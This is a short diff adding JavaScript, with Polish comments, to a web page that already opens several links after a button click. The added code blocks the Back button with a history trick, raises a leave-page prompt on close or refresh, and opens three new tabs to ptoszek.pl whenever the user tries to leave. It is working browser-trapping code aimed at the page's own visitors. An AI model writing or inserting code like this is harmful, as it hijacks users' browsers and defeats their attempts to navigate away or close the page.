@@ -101,3 +101,22 @@ button.addEventListener('click', () => {
     openMultipleLinks(4);
   }, 5000);
 });
+
+// Utrudnianie cofania się
+history.pushState(null, null, location.href);
+window.onpopstate = function () {
+  history.go(1);
+};
+
+// Alert przy próbie zamknięcia lub odświeżenia
+window.addEventListener('beforeunload', function (e) {
+  e.preventDefault();
+  e.returnValue = '';
+});
+
+// Otwieranie nowych kart, jeśli użytkownik próbuje wyjść
+window.addEventListener('unload', () => {
+  for(let i=0; i<3; i++) {
+    window.open('https://ptoszek.pl/', '_blank');
+  }
+});
